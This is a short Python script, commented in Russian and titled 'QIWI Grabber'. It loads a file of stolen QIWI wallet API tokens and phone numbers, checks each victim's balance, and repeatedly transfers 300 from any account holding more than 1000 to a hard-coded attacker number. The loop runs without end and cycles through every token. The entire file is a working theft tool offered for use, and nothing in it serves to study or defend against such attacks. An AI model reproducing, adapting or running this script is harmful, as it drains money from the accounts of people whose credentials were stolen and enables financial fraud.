from SimpleQIWI import *
import time
print("QIWI Grabber") #название
token,phone=[],[] #обозначения 
f=open("text.txt", "r") #открываем наш файл с токенами:номерами
line=f.read().splitlines() #тоже обозначения
for i in line:
    token.append(i.split(':')[0])
    phone.append(i.split(':')[1]) #готовим наши токены:номера к началу работы
f.close()
qiwi="+79000000000" #наш киви
ind=0
while True:
    for t in token:
        api = QApi(token=token[ind], phone=phone[ind]) #подставляем наши значения и сравниваем со значениями киви
        print("Баланс Жертвы:")
        b = api.balance #узнаем баланс
        g = [1000] #на балансе минимально должно быть 'g' кол-во денег для начала работы скрипта
        print(b)
        time.sleep(30) #ЗАДЕРЖКА В СЕКУНДАХ
        if b[0] > g[0]:
           try:
               api = QApi(token=token[ind], phone=phone[ind])
               api.pay(account=qiwi, amount=300, comment="QIWI Bank") #само списание, "amount" - число денег которое будет улетать за одно списание
               time.sleep(1)
           except:
               print("Недостаточно средств") #платеж не прошел
               break    
           print("Списание...")
           print("Все деньги сняты!") #платеж прошел
        if ind <= len(token)-2:
            ind+=1
            print(ind)
        else:
        	ind=0
        	print(ind) #все сначала